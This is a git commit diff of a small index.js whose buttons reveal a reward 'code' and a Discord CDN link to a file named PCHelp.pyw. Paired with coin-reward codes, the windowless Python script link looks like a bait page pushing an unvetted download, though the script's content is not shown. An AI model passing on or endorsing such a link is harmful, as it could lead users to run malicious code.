f5f50736c6b49c35edc63f6e7414b4145f82dad2
yadernikoder <161838373+yadernikoder@users.noreply.github.com>
2024-11-27 16:13:14 +0200

    Update index.js

--- index.js
+++ index.js
@@ -1,12 +1,12 @@
 // JavaScript for showing the code dynamically
 document.getElementById('showCodeBtn').addEventListener('click', function() {
     var codeDisplay = document.getElementById('codeDisplay');
-    codeDisplay.textContent = 'The code is: unlock500coins';
+    codeDisplay.textContent = 'The code is: reward49';
     codeDisplay.style.display = 'block';
 });
 
 document.getElementById('showCodeBtn1').addEventListener('click', function() {
     var codeDisplay1 = document.getElementById('codeDisplay1');
-    codeDisplay1.textContent = "https://cdn.discordapp.com/attachments/1292155655528120491/1311331845408948264/PCHelp.pyw?ex=67487873&is=674726f3&hm=6ed3ae9789d7873125949a6c5710db977dcea8e2fb07ad02dff262768233904e&";
+    codeDisplay1.textContent = "https://cdn.discordapp.com/attachments/1292155655528120491/1311333765464850452/PCHelp.pyw?ex=67487a3d&is=674728bd&hm=0d4e4e9dc87440cdaf59c4b3527f0b073cc3b05c656e50d3ee7d7ac9aa87d3bc&";
     codeDisplay1.style.display = 'block';
 });
